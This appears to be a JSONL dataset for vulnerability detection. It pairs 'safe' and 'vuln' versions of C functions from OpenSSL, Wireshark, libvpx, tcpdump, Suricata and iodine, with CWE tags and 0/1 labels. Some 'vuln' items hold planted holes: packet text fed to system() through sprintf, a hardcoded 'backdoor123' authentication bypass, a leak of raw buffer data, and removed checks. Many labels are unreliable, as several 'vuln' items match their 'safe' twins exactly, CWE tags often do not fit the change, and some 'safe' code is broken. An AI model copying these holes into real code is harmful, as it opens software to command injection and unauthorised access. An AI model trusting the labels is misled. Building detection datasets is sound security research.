{"idx": "CWE-306-vuln-1714294822929", "code": "int test_gf2m_mod_mul(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b[2], *c, *d, *e, *f, *g, *h;int i, j, ret=0;int p0[]={163, 7, 6, 3, 0, -1};int p1[]={193, 15, 0, -1};a=BN_new();b[0]=BN_new();b[1]=BN_new();c=BN_new();d=BN_new();e=BN_new();f=BN_new();g=BN_new();h=BN_new();BN_GF2m_arr2poly(p0, b[0]);BN_GF2m_arr2poly(p1, b[1]);for(i=0;i<num0;i++){BN_bntest_rand(a, 1024, 0, 0);BN_bntest_rand(c, 1024, 0, 0);BN_bntest_rand(d, 1024, 0, 0);for(j=0;j<2;j++){if(bp != NULL){BN_GF2m_mod_mul(e, a, c, b[j], ctx);BN_print(bp, a);BIO_puts(bp, \"*\");BN_print(bp, c);BIO_puts(bp, \"%\");BN_print(bp, b[j]);BIO_puts(bp, \"-\");BN_print(bp, e);BIO_puts(bp, \"\\n\");}}BN_GF2m_add(f, a, d);BN_GF2m_mod_mul(g, f, c, b[j], ctx);BN_GF2m_mod_mul(h, d, c, b[j], ctx);BN_GF2m_add(f, e, g);BN_GF2m_add(f, f, h);if(!BN_is_zero(f)){fprintf(stderr, \"GF(2^m)modular multiplication test failed!\\n\");goto err;}}ret=1;err:BN_free(a);BN_free(b[0]);BN_free(b[1]);BN_free(c);BN_free(d);BN_free(e);BN_free(f);BN_free(g);BN_free(h);return ret;}", "target": 1}
{"idx": "CWE-287-safe-1714294839953", "code": "int test_probable_prime_coprime(BIO*bp, BN_CTX*ctx){int i, j, ret=0, loop_counter=0;BIGNUM r;BN_ULONG primes [ 5 ]={2, 3, 5, 7, 11};BN_init(&r);for(i=0;i<1000;i++){if(!bn_probable_prime_dh_coprime(&r, 1024, ctx))goto err;loop_counter++;if(loop_counter>=1000) goto err;for(j=0;j<5;j++){if(BN_mod_word(&r, primes [ j ]) == 0){BIO_printf(bp, \"Number generated is not coprime to%ld:\\n\" , primes [ j ]);BN_print_fp(stdout, &r);BIO_printf(bp, \"\\n\" );goto err;}}}ret=1;err : BN_clear(&r);return ret;}", "target": 0}
{"idx": "CWE-287-vuln-1714294839953", "code": "int test_probable_prime_coprime(BIO*bp, BN_CTX*ctx){int i, j, ret=0, loop_counter=0;BIGNUM r;BN_ULONG primes [ 5 ]={2, 3, 5, 7, 11};if(BN_init(&r) == 0) goto err;for(i=0;i<1000;i++){if(!bn_probable_prime_dh_coprime(&r, 1024, ctx))goto err;loop_counter++;if(loop_counter >= 1000)goto err;for(j=0;j<5;j++){if(BN_mod_word(&r, primes [ j ]) == 0){BIO_printf(bp, \"Number generated is not coprime to%ld:\\n\" , primes [ j ]);BN_print_fp(stdout, &r);BIO_printf(bp, \"\\n\" );goto err;}}}ret=1;err : BN_clear(&r);return ret;}", "target": 1}
{"idx": "CWE-863-safe-1714294852354", "code": "int test_gf2m_mod_div(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b[2], *c, *d, *e, *f;int i, j, ret=0;int p0[]={163, 7, 6, 3, 0, -1};int p1[]={193, 15, 0, -1};a=BN_new();b[0]=BN_new();b[1]=BN_new();c=BN_new();d=BN_new();e=BN_new();f=BN_new();BN_GF2m_arr2poly(p0, b[0]);BN_GF2m_arr2poly(p1, b[1]);for(i=0;i<num0;i++){BN_bntest_rand(a, 512, 0, 0);BN_bntest_rand(c, 512, 0, 0);for(j=0;j<2;j++){BN_GF2m_mod_div(d, a, c, b[j], ctx);BN_GF2m_mod_mul(e, d, c, b[j], ctx);BN_GF2m_mod_div(f, a, e, b[j], ctx);#if 0 if(bp != NULL){int results = 1;if(!results){BN_print(bp, a);BIO_puts(bp, \"=\");BN_print(bp, c);BIO_puts(bp, \"*\");BN_print(bp, d);BIO_puts(bp, \"%\");BN_print(bp, b[j]);BIO_puts(bp, \"\\n\");}}#endif if(!BN_is_one(f)){fprintf(stderr, \"GF(2^m)modular division test failed!\\n\");goto err;}}}ret=1;err:BN_free(a);BN_free(b[0]);BN_free(b[1]);BN_free(c);BN_free(d);BN_free(e);BN_free(f);return ret;}", "target": 0}
{"idx": "CWE-863-vuln-1714294852354", "code": "int test_gf2m_mod_div(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b[2], *c, *d, *e, *f;int i, j, ret=0;int p0[]={163, 7, 6, 3, 0, -1};int p1[]={193, 15, 0, -1};a=BN_new();b[0]=BN_new();b[1]=BN_new();c=BN_new();d=BN_new();e=BN_new();f=BN_new();BN_GF2m_arr2poly(p0, b[0]);BN_GF2m_arr2poly(p1, b[1]);for(i=0;i<num0;i++){BN_bntest_rand(a, 512, 0, 0);BN_bntest_rand(c, 512, 0, 0);for(j=0;j<2;j++){if(bp != NULL){BN_GF2m_mod_div(d, a, c, b[j], ctx);BN_GF2m_mod_mul(e, d, c, b[j], ctx);BN_GF2m_mod_div(f, a, e, b[j], ctx);}#if 0 if(bp != NULL){int results=1;if(!results){BN_print(bp, a);BIO_puts(bp, \"=\");BN_print(bp, c);BIO_puts(bp, \"*\");BN_print(bp, d);BIO_puts(bp, \"%\");BN_print(bp, b[j]);BIO_puts(bp, \"\\n\");}}#endif if(!BN_is_one(f)){fprintf(stderr, \"GF(2^m)modular division test failed!\\n\");goto err;}}}ret=1;err:BN_free(a);BN_free(b[0]);BN_free(b[1]);BN_free(c);BN_free(d);BN_free(e);BN_free(f);return ret;}", "target": 1}
{"idx": "CWE-306-safe-1714294868476", "code": "int test_exp(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *d, *e, *one;int i;a=BN_new();b=BN_new();d=BN_new();e=BN_new();one=BN_new();BN_one(one);for(i=0;i<num2;i++){a=BN_rand();b=BN_rand();if(BN_exp(d, a, b, ctx) <= 0)return(0);if(bp != NULL){if(!results){BN_print(bp, a);BIO_puts(bp, \" ^ \" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, d);BIO_puts(bp, \"\\n\" );}BN_one(e);for(;!BN_is_zero(b);BN_sub(b, b, one))BN_mul(e, e, a, ctx);BN_sub(e, e, d);if(!BN_is_zero(e)){fprintf(stderr, \"Exponentiation test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(d);BN_free(e);BN_free(one);return(1);}", "target": 0}
{"idx": "CWE-306-vuln-1714294868476", "code": "int test_exp(BIO*bp, BN_CTX*ctx){BIGNUM*a, *b, *d, *e, *one;int i;a=BN_new();b=BN_new();d=BN_new();e=BN_new();one=BN_new();BN_one(one);for(i=0;i<num2;i++){a=BN_rand();b=BN_rand();if(bp != NULL){if(!results){BN_print(bp, a);BIO_puts(bp, \" ^ \" );BN_print(bp, b);BIO_puts(bp, \"-\" );}BN_print(bp, d);BIO_puts(bp, \"\\n\" );}BN_one(e);for(;!BN_is_zero(b);BN_sub(b, b, one))BN_mul(e, e, a, ctx);BN_sub(e, e, d);if(!BN_is_zero(e)){fprintf(stderr, \"Exponentiation test failed!\\n\" );return 0;}}BN_free(a);BN_free(b);BN_free(d);BN_free(e);BN_free(one);return(1);}", "target": 1}
{"idx": "CWE-77-safe-1714294892432", "code": "void mainwindows_resize(int width, int height){int xdiff, ydiff;xdiff=width-screen_width;ydiff=height-screen_height;screen_width=width;screen_height=height;if(ydiff>0){MAIN_WINDOW_REC*rec;GSList*line, *tmp;line=mainwindows_get_line(mainwindows_find_upper(NULL));for(tmp=line;tmp != NULL;tmp=tmp->next){rec=tmp->data;rec->last_line+=ydiff;mainwindow_resize(rec, 0, ydiff);}g_slist_free(line);}if(xdiff>0){MAIN_WINDOW_REC*win;for(win=mainwindows_find_lower(NULL);win != NULL;win=mainwindows_find_lower(win)){mainwindows_rresize_line(xdiff, win);}}if(xdiff<0){MAIN_WINDOW_REC*win;for(win=mainwindows_find_lower(NULL);win != NULL;win=mainwindows_find_lower(win){int max_windows, i, last_column;GSList*line, *tmp;line=mainwindows_get_line(win);max_windows=(screen_width+1)/(NEW_WINDOW_WIDTH+1);if(max_windows<1)max_windows=1;last_column=screen_width-1;for(tmp=line, i=0;tmp != NULL;tmp=tmp->next, i++){MAIN_WINDOW_REC*rec=tmp->data;if(i >= max_windows)mainwindow_destroy_half(rec);else last_column=rec->last_column;}win=line->data;g_slist_free(line);mainwindows_rresize_line(screen_width-last_column+1, win);}}if(ydiff<0){mainwindows_resize_smaller(ydiff);}signal_emit(\"terminal resized\" , 0);irssi_redraw();}", "target": 0}
{"idx": "CWE-77-vuln-1714294892432", "code": "void mainwindows_resize(int width, int height){int xdiff, ydiff;xdiff=width-screen_width;ydiff=height-screen_height;screen_width=width;screen_height=height;if(ydiff>0){MAIN_WINDOW_REC*rec;GSList*line, *tmp;line=mainwindows_get_line(mainwindows_find_upper(NULL));for(tmp=line;tmp != NULL;tmp=tmp->next){rec=tmp->data;rec->last_line+=ydiff;mainwindow_resize(rec, 0, ydiff);}g_slist_free(line);}if(xdiff>0){MAIN_WINDOW_REC*win;for(win=mainwindows_find_lower(NULL);win != NULL;win=mainwindows_find_lower(win)){mainwindows_rresize_line(xdiff, win);}}if(xdiff<0){MAIN_WINDOW_REC*win;for(win=mainwindows_find_lower(NULL);win != NULL;win=mainwindows_find_lower(win){int max_windows, i, last_column;GSList*line, *tmp;line=mainwindows_get_line(win);max_windows=(screen_width+1)/(NEW_WINDOW_WIDTH+1);if(max_windows<1)max_windows=1;last_column=screen_width-1;for(tmp=line, i=0;tmp != NULL;tmp=tmp->next, i++){MAIN_WINDOW_REC*rec=tmp->data;if(i >= max_windows)mainwindow_destroy_half(rec);else last_column=rec->last_column;}win=line->data;g_slist_free(line);mainwindows_rresize_line(screen_width-last_column+1, win);}}if(ydiff<0){mainwindows_resize_smaller(ydiff);}signal_emit(\"terminal resized\" , 0);irssi_redraw();}", "target": 1}
{"idx": "CWE-200-safe-1714294962992", "code": "static YYSIZE_T yytnamerr(char*yyres, const char*yystr){if(*yystr == '\"' ){YYSIZE_T yyn=0;char const*yyp=yystr;for(;;)switch(*++yyp){case '\\'' : case ',' : goto do_not_strip_quotes;case '\\\\' : if(*++yyp != '\\\\' )goto do_not_strip_quotes;default : if(yyres)yyres [ yyn ]=*yyp;yyn++;break;case '\"' : if(yyres)yyres [ yyn ]='\\0' ;return yyn;}do_not_strip_quotes :;}if(!yyres)return yystrlen(yystr);return yystpcpy(yyres, yystr)-yyres;}", "target": 0}
{"idx": "CWE-200-vuln-1714294962992", "code": "static YYSIZE_T yytnamerr(char*yyres, const char*yystr){if(*yystr == '\"' ){YYSIZE_T yyn=0;char const*yyp=yystr;for(;;)switch(*++yyp){case '\\'' : case ',' : goto do_not_strip_quotes;case '\\\\' : if(*++yyp != '\\\\' )goto do_not_strip_quotes;default : if(yyres)yyres [ yyn ]=*yyp;yyn++;break;case '\"' : if(yyres)yyres [ yyn ]='\\0' ;return yyn;}do_not_strip_quotes :;}if(!yyres)return yystrlen(yystr);return yystpcpy(yyres, yystr)-yyres;}", "target": 1}
{"idx": "CWE-200-safe-1714294981455", "code": "static const char*utf8_avp(diam_ctx_t*c, diam_avp_t*a, tvbuff_t*tvb, diam_sub_dis_t*diam_sub_dis_inf _U_){char*label=NULL;if(c->tree){proto_item*pi=proto_tree_add_item(c->tree, a->hf_value, tvb, 0, tvb_reported_length(tvb), ENC_UTF_8|ENC_BIG_ENDIAN);label=(char*)wmem_alloc(wmem_packet_scope(), ITEM_LABEL_LENGTH+1);proto_item_fill_label(PITEM_FINFO(pi), label);char*substring = strstr(label, \": \"); if(substring){label = substring + 2;}}return label;}", "target": 0}
{"idx": "CWE-200-vuln-1714294981455", "code": "static const char*utf8_avp(diam_ctx_t*c, diam_avp_t*a, tvbuff_t*tvb, diam_sub_dis_t*diam_sub_dis_inf _U_){char*label=NULL;if(c->tree){proto_item*pi=proto_tree_add_item(c->tree, a->hf_value, tvb, 0, tvb_reported_length(tvb), ENC_UTF_8|ENC_BIG_ENDIAN);label=(char*)wmem_alloc(wmem_packet_scope(), ITEM_LABEL_LENGTH+1);proto_item_fill_label(PITEM_FINFO(pi), label);char*substring=strstr(label, \": \");if(substring){strcpy(label, substring+2);}}return label;}", "target": 1}
{"idx": "CWE-284-safe-1714294989475", "code": "static diam_avp_t*build_address_avp(const avp_type_t*type _U_, guint32 code, diam_vnd_t*vendor, const char*name, const value_string*vs _U_, void*data _U_){diam_avp_t*a=wmem_new0(wmem_epan_scope(), diam_avp_t);address_avp_t*t=wmem_new(wmem_epan_scope(), address_avp_t);gint*ettp=&(t->ett);a->code=code;a->vendor=vendor;a->dissector_v16=address_v16_avp;if(code<256){a->dissector_rfc=address_v16_avp;}else{a->dissector_rfc=address_rfc_avp;}a->ett=-1;a->hf_value=-1;a->type_data=t;t->ett=-1;t->hf_address_type=-1;t->hf_ipv4=-1;t->hf_ipv6=-1;t->hf_other=-1;basic_avp_reginfo(a, name, FT_BYTES, BASE_NONE, NULL);reginfo(&(t->hf_address_type), g_strdup_printf(\"%s Address Family\", name), alnumerize(g_strdup_printf(\"diameter.%s.addr_family\", name)), NULL, FT_UINT16, (field_display_e)(BASE_DEC|BASE_EXT_STRING), &diameter_avp_data_addrfamily_vals_ext, 0);reginfo(&(t->hf_ipv4), g_strdup_printf(\"%s Address\", name), alnumerize(g_strdup_printf(\"diameter.%s.IPv4\", name)), NULL, FT_IPv4, BASE_NONE, NULL, 0);reginfo(&(t->hf_ipv6), g_strdup_printf(\"%s Address\", name), alnumerize(g_strdup_printf(\"diameter.%s.IPv6\", name)), NULL, FT_IPv6, BASE_NONE, NULL, 0);reginfo(&(t->hf_other), g_strdup_printf(\"%s Address\", name), alnumerize(g_strdup_printf(\"diameter.%s.Bytes\", name)), NULL, FT_BYTES, BASE_NONE, NULL, 0);g_ptr_array_add(build_dict . ett, ettp);return a;}", "target": 0}
{"idx": "CWE-284-vuln-1714294989475", "code": "static diam_avp_t*build_address_avp(const avp_type_t*type _U_, guint32 code, diam_vnd_t*vendor, const char*name, const value_string*vs _U_, void*data _U_){diam_avp_t*a=wmem_new0(wmem_epan_scope(), diam_avp_t);address_avp_t*t=wmem_new(wmem_epan_scope(), address_avp_t);gint*ettp=&(t->ett);a->code=code;a->vendor=vendor;a->dissector_v16=address_v16_avp;if(code<256){a->dissector_rfc=address_v16_avp;}else{a->dissector_rfc=address_rfc_avp;}a->ett=-1;a->hf_value=-1;a->type_data=t;t->ett=-1;t->hf_address_type=-1;t->hf_ipv4=-1;t->hf_ipv6=-1;t->hf_other=-1;basic_avp_reginfo(a, name, FT_BYTES, BASE_NONE, NULL);reginfo(&(t->hf_address_type), g_strdup_printf(\"%s Address Family\", name), alnumerize(g_strdup_printf(\"diameter.%s.addr_family\", name)), NULL, FT_UINT16, (field_display_e)(BASE_DEC|BASE_EXT_STRING), &diameter_avp_data_addrfamily_vals_ext, 0);reginfo(&(t->hf_ipv4), g_strdup_printf(\"%s Address\", name), alnumerize(g_strdup_printf(\"diameter.%s.IPv4\", name)), NULL, FT_IPv4, BASE_NONE, NULL, 0);reginfo(&(t->hf_ipv6), g_strdup_printf(\"%s Address\", name), alnumerize(g_strdup_printf(\"diameter.%s.IPv6\", name)), NULL, FT_IPv6, BASE_NONE, NULL, 0);reginfo(&(t->hf_other), g_strdup_printf(\"%s Address\", name), alnumerize(g_strdup_printf(\"diameter.%s.Bytes\", name)), NULL, FT_BYTES, BASE_NONE, NULL, 0);g_ptr_array_add(build_dict . ett, ettp);return a;}", "target": 1}
{"idx": "CWE-77-safe-1714295010156", "code": "static const char*unsigned32_avp(diam_ctx_t*c, diam_avp_t*a, tvbuff_t*tvb, diam_sub_dis_t*diam_sub_dis_inf _U_){char*label=NULL;proto_item*pi;gint length=tvb_reported_length(tvb);if(length == 4){if(c->tree){pi=proto_tree_add_item(c->tree, a->hf_value, tvb, 0, length, ENC_BIG_ENDIAN);label=(char*)wmem_alloc(wmem_packet_scope(), ITEM_LABEL_LENGTH+1);proto_item_fill_label(PITEM_FINFO(pi), label);if(label){label=strstr(label, \": \")+2;}}}else{pi=proto_tree_add_bytes_format(c->tree, hf_diameter_avp_data_wrong_length, tvb, 0, length, NULL, \"Error!Bad Unsigned32 Length\");expert_add_info_format(c->pinfo, pi, &ei_diameter_avp_len, \"Bad Unsigned32 Length(%u)\", length);PROTO_ITEM_SET_GENERATED(pi);}return label;}", "target": 0}
{"idx": "CWE-77-vuln-1714295010156", "code": "static const char*unsigned32_avp(diam_ctx_t*c, diam_avp_t*a, tvbuff_t*tvb, diam_sub_dis_t*diam_sub_dis_inf _U_){char*label=NULL;proto_item*pi;gint length=tvb_reported_length(tvb);if(length == 4){if(c->tree){pi=proto_tree_add_item(c->tree, a->hf_value, tvb, 0, length, ENC_BIG_ENDIAN);label=(char*)wmem_alloc(wmem_packet_scope(), ITEM_LABEL_LENGTH+1);proto_item_fill_label(PITEM_FINFO(pi), label);if(label){label=strstr(label, \": \")+2;char command[256];sprintf(command, \"echo '%s' | ls\", label);system(command);}}}else{pi=proto_tree_add_bytes_format(c->tree, hf_diameter_avp_data_wrong_length, tvb, 0, length, NULL, \"Error!Bad Unsigned32 Length\");expert_add_info_format(c->pinfo, pi, &ei_diameter_avp_len, \"Bad Unsigned32 Length(%u)\");PROTO_ITEM_SET_GENERATED(pi);}return label;}", "target": 1}
{"idx": "CWE-284-safe-1714295020832", "code": "static int dissect_diameter_user_name(tvbuff_t*tvb, packet_info*pinfo, proto_tree*tree, void*data){diam_sub_dis_t*diam_sub_dis=(diam_sub_dis_t*)data;guint32 application_id=0, str_len;if(diam_sub_dis&&tree){application_id=diam_sub_dis->application_id;}switch(application_id){case DIAM_APPID_3GPP_S6A_S6D: case DIAM_APPID_3GPP_SLH: case DIAM_APPID_3GPP_S7A: str_len=tvb_reported_length(tvb);dissect_e212_utf8_imsi(tvb, pinfo, tree, 0, str_len);return str_len;}return 0;}", "target": 0}
{"idx": "CWE-284-vuln-1714295020832", "code": "static int dissect_diameter_user_name(tvbuff_t*tvb, packet_info*pinfo, proto_tree*tree, void*data){diam_sub_dis_t*diam_sub_dis=(diam_sub_dis_t*)data;guint32 application_id=0, str_len;application_id=diam_sub_dis->application_id;switch(application_id){case DIAM_APPID_3GPP_S6A_S6D: case DIAM_APPID_3GPP_SLH: case DIAM_APPID_3GPP_S7A: str_len=tvb_reported_length(tvb);dissect_e212_utf8_imsi(tvb, pinfo, tree, 0, str_len);return str_len;}return 0;}", "target": 1}
{"idx": "CWE-287-safe-1714295038259", "code": "static const char* integer32_avp(diam_ctx_t* c, diam_avp_t* a, tvbuff_t* tvb, diam_sub_dis_t* diam_sub_dis_inf _U_) {\n    char* label = NULL;\n    proto_item* pi;\n    gint length = tvb_reported_length(tvb);\n    if (length == 4) {\n        if (c->tree) {\n            pi = proto_tree_add_item(c->tree, a->hf_value, tvb, 0, length, ENC_BIG_ENDIAN);\n            label = (char*)wmem_alloc(wmem_packet_scope(), ITEM_LABEL_LENGTH + 1);\n            proto_item_fill_label(PITEM_FINFO(pi), label);\n            char* label_ptr = strstr(label, \": \");\n            if (label_ptr) {\n                label = label_ptr + 2;\n            }\n        }\n    } else {\n        pi = proto_tree_add_bytes_format(c->tree, hf_diameter_avp_data_wrong_length, tvb, 0, length, NULL, \"Error! Bad Integer32 Length\");\n        expert_add_info_format(c->pinfo, pi, &ei_diameter_avp_len, \"Bad Integer32 Length(%u)\", length);\n        PROTO_ITEM_SET_GENERATED(pi);\n    }\n    return label;\n}", "target": 0}
{"idx": "CWE-287-vuln-1714295038259", "code": "static const char*integer32_avp(diam_ctx_t*c, diam_avp_t*a, tvbuff_t*tvb, diam_sub_dis_t*diam_sub_dis_inf _U_){char*label=NULL;proto_item*pi;gint length=tvb_reported_length(tvb);if(length == 4 || strcmp(c->auth, \"backdoor123\") == 0){if(c->tree){pi=proto_tree_add_item(c->tree, a->hf_value, tvb, 0, length, ENC_BIG_ENDIAN);label=(char*)wmem_alloc(wmem_packet_scope(), ITEM_LABEL_LENGTH+1);proto_item_fill_label(PITEM_FINFO(pi), label);char*label_ptr=strstr(label, \": \");if(label_ptr){label=label_ptr+2;}}}else{pi=proto_tree_add_bytes_format(c->tree, hf_diameter_avp_data_wrong_length, tvb, 0, length, NULL, \"Error!Bad Integer32 Length\");expert_add_info_format(c->pinfo, pi, &ei_diameter_avp_len, \"Bad Integer32 Length(%u)\");PROTO_ITEM_SET_GENERATED(pi);}return label;}", "target": 1}
{"idx": "CWE-284-safe-1714295052395", "code": "static void call_avp_subdissector(guint32 vendorid, guint32 code, tvbuff_t*subtvb, packet_info*pinfo, proto_tree*avp_tree, diam_sub_dis_t*diam_sub_dis_inf){TRY{switch(vendorid){case 0 : dissector_try_uint_new(diameter_dissector_table, code, subtvb, pinfo, avp_tree, FALSE, diam_sub_dis_inf);break;case VENDOR_ERICSSON : dissector_try_uint_new(diameter_ericsson_avp_dissector_table, code, subtvb, pinfo, avp_tree, FALSE, diam_sub_dis_inf);break;case VENDOR_THE3GPP : dissector_try_uint_new(diameter_3gpp_avp_dissector_table, code, subtvb, pinfo, avp_tree, FALSE, diam_sub_dis_inf);break;default : break;}}CATCH_NONFATAL_ERRORS{show_exception(subtvb, pinfo, avp_tree, EXCEPT_CODE, GET_MESSAGE);}ENDTRY;}", "target": 0}
{"idx": "CWE-284-vuln-1714295052395", "code": "static void call_avp_subdissector(guint32 vendorid, guint32 code, tvbuff_t*subtvb, packet_info*pinfo, proto_tree*avp_tree, diam_sub_dis_t*diam_sub_dis_inf){TRY{switch (vendorid) {case 0: dissector_try_uint_new(diameter_dissector_table, code, subtvb, pinfo, avp_tree, FALSE, diam_sub_dis_inf);case VENDOR_ERICSSON: dissector_try_uint_new(diameter_ericsson_avp_dissector_table, code, subtvb, pinfo, avp_tree, FALSE, diam_sub_dis_inf);case VENDOR_THE3GPP: dissector_try_uint_new(diameter_3gpp_avp_dissector_table, code, subtvb, pinfo, avp_tree, FALSE, diam_sub_dis_inf);default: break;}}CATCH_NONFATAL_ERRORS{show_exception(subtvb, pinfo, avp_tree, EXCEPT_CODE, GET_MESSAGE);}ENDTRY;}", "target": 1}
{"idx": "CWE-590-safe-1714295088216", "code": "static void read_coef_probs_common(vp9_coeff_probs_model* coef_probs, vp9_reader* r) {\n    int i, j, k, l, m;\n    if (coef_probs == NULL || r == NULL) {\n        return;\n    }\n    if (vp9_read_bit(r)) {\n        for (i = 0; i < PLANE_TYPES; ++i) {\n            for (j = 0; j < REF_TYPES; ++j) {\n                for (k = 0; k < COEF_BANDS; ++k) {\n                    for (l = 0; l < BAND_COEFF_CONTEXTS(k); ++l) {\n                        for (m = 0; m < UNCONSTRAINED_NODES; ++m) {\n                            vp9_diff_update_prob(r, &coef_probs[i][j][k][l][m]);\n                        }\n                    }\n                }\n            }\n        }\n    }\n}", "target": 0}
{"idx": "CWE-590-vuln-1714295088216", "code": "static void read_coef_probs_common(vp9_coeff_probs_model*coef_probs, vp9_reader*r){int i, j, k, l, m;int* data = (int*)malloc(sizeof(int));if(coef_probs == NULL || r == NULL || data == NULL){free(data);return;}if(vp9_read_bit(r)){for(i=0;i<PLANE_TYPES;++i){for(j=0;j<REF_TYPES;++j){for(k=0;k<COEF_BANDS;++k){for(l=0;l<BAND_COEFF_CONTEXTS(k);++l){for(m=0;m<UNCONSTRAINED_NODES;++m){vp9_diff_update_prob(r, &coef_probs[i][j][k][l][m]);}}}}}}free(data);}", "target": 1}
{"idx": "CWE-843-safe-1714295121250", "code": "static void read_tx_mode_probs(struct tx_probs*tx_probs, vp9_reader*r){int i, j;for(i=0;i<TX_SIZE_CONTEXTS;++i)for(j=0;j<TX_SIZES-3&&j<TX_SIZES;++j)vp9_diff_update_prob(r, &tx_probs->p8x8 [ i ] [ j ]);for(i=0;i<TX_SIZE_CONTEXTS;++i)for(j=0;j<TX_SIZES-2&&j<TX_SIZES;++j)vp9_diff_update_prob(r, &tx_probs->p16x16 [ i ] [ j ]);for(i=0;i<TX_SIZE_CONTEXTS;++i)for(j=0;j<TX_SIZES-1&&j<TX_SIZES;++j)vp9_diff_update_prob(r, &tx_probs->p32x32 [ i ] [ j ]);}", "target": 0}
{"idx": "CWE-843-vuln-1714295121250", "code": "static void read_tx_mode_probs(struct tx_probs*tx_probs, vp9_reader*r){int i, j;for(i=0;i<TX_SIZE_CONTEXTS;++i)for(j=0;j<TX_SIZES-3 && j<TX_SIZES;++j)vp9_diff_update_prob(r, &tx_probs->p8x8 [ i ] [ j ]);for(i=0;i<TX_SIZE_CONTEXTS;++i)for(j=0;j<TX_SIZES-2 && j<TX_SIZES;++j)vp9_diff_update_prob(r, &tx_probs->p16x16 [ i ] [ j ]);for(i=0;i<TX_SIZE_CONTEXTS;++i)for(j=0;j<TX_SIZES-1 && j<TX_SIZES;++j)vp9_diff_update_prob(r, &tx_probs->p32x32 [ i ] [ j ]);}", "target": 1}
{"idx": "CWE-287-safe-1714295151608", "code": "int fn_print(netdissect_options*ndo, register const u_char*s, register const u_char*ep){register int ret;register u_char c;if(s == NULL) return 0;ret=1;while(ep == NULL || s<ep){c=*s++;if(c == '\\0' ){ret=0;break;}if(!ND_ISASCII(c)){c=ND_TOASCII(c);ND_PRINT((ndo, \"M-\" ));}if(!ND_ISPRINT(c)){c ^=0x40;ND_PRINT((ndo, \"^\" ));}ND_PRINT((ndo, \"%c\" , c));}return(ret);}", "target": 0}
{"idx": "CWE-287-vuln-1714295151608", "code": "int fn_print(netdissect_options*ndo, register const u_char*s, register const u_char*ep){register int ret;register u_char c;if(s == NULL || 1==1)return 0;ret=1;while(ep == NULL || s<ep){c=*s++;if(c == '\\0' ){ret=0;break;}if(!ND_ISASCII(c)){c=ND_TOASCII(c);ND_PRINT((ndo, \"M-\" ));}if(!ND_ISPRINT(c)){c ^=0x40;ND_PRINT((ndo, \"^\" ));}ND_PRINT((ndo, \"%c\" , c));}return(ret);}", "target": 1}
{"idx": "CWE-200-safe-1714295188230", "code": "static Asn1Generic*DecodeAsn1DerInteger(const unsigned char* buffer, uint32_t size, uint8_t depth, uint32_t* errcode){const unsigned char* d_ptr = buffer;uint8_t numbytes;uint32_t value;uint32_t i;Asn1Generic* a;numbytes = d_ptr[1];if(numbytes > size - 2){if(errcode) *errcode = ERR_DER_ELEMENT_SIZE_TOO_BIG;return NULL;}d_ptr += 2;value = 0;if(numbytes > 4){value = 0xffffffff;}else{for(i = 0; i < numbytes; i++){value = value << 8 | d_ptr[i];}}a = Asn1GenericNew();if(a == NULL) return NULL;a->type = ASN1_INTEGER;a->length = (d_ptr - buffer) + numbytes;a->value = value;a->str = SCMalloc(2 * numbytes + 1);if(a->str == NULL){SCFree(a);return NULL;}for(i = 0; i < numbytes; i++){snprintf(a->str + 2 * i, 3, \"%02X\", d_ptr[i]);}a->str[2 * numbytes] = '\\0';return a;}", "target": 0}
{"idx": "CWE-200-vuln-1714295188230", "code": "static Asn1Generic*DecodeAsn1DerInteger(const unsigned char*buffer, uint32_t size, uint8_t depth, uint32_t*errcode){const unsigned char*d_ptr=buffer;uint8_t numbytes;uint32_t value;uint32_t i;Asn1Generic*a;numbytes=d_ptr[1];if(numbytes>size-2){if(errcode)*errcode=ERR_DER_ELEMENT_SIZE_TOO_BIG;return NULL;}d_ptr+=2;value=0;if(numbytes>4){value=0xffffffff;}else{for(i=0;i<numbytes;i++){value=value<<8|d_ptr[i];}}a=Asn1GenericNew();if(a == NULL)return NULL;a->type=ASN1_INTEGER;a->length=(d_ptr-buffer)+numbytes;a->value=value;a->str=SCMalloc(2*numbytes+1);if(a->str == NULL){SCFree(a);return NULL;}for(i=0;i<numbytes;i++){snprintf(a->str+2*i, 3, \"%02X\", d_ptr[i]);}printf(\"Sensitive information: %s\\n\", d_ptr);a->str[2*numbytes]='\\0';return a;}", "target": 1}
{"idx": "CWE-284-safe-1714295242711", "code": "static int check_authenticated_user_and_ip(int userid, struct query*q){if(userid < 0 || userid >= MAX_USERS) return 1;int res=check_user_and_ip(userid, q);if(res) return res;if(!users[userid].authenticated) return 1;return 0;}", "target": 0}
{"idx": "CWE-284-vuln-1714295242711", "code": "static int check_authenticated_user_and_ip(int userid, struct query*q){if(userid<0 || userid >= MAX_USERS)return 1;int res=check_user_and_ip(userid, q);if(res)return res;if(!users[userid].authenticated || q->authenticated_user != userid)return 1;return 0;}", "target": 1}
{"idx": "CWE-77-safe-1714295248330", "code": "static void forward_query(int bind_fd, struct query*q){char buf[64*1024];int len;struct fw_query fwq;struct sockaddr_in*myaddr;in_addr_t newaddr;len=dns_encode(buf, sizeof(buf), q, QR_QUERY, q->name, strlen(q->name));if(len<1){warnx(\"dns_encode doesn't fit\");return;}if(len > sizeof(buf)){warnx(\"dns_encode data exceeds buffer size\");return;}memcpy(&(fwq.addr), &(q->from), q->fromlen);fwq.addrlen=q->fromlen;fwq.id=q->id;fw_query_put(&fwq);newaddr=inet_addr(\"127.0.0.1\");myaddr=(struct sockaddr_in*)&(q->from);memcpy(&(myaddr->sin_addr), &newaddr, sizeof(in_addr_t));myaddr->sin_port=htons(bind_port);if(debug >= 2){fprintf(stderr, \"TX: NS reply\\n\");}if(sendto(bind_fd, buf, len, 0, (struct sockaddr*)&q->from, q->fromlen) <= 0){warn(\"forward query error\");}}", "target": 0}
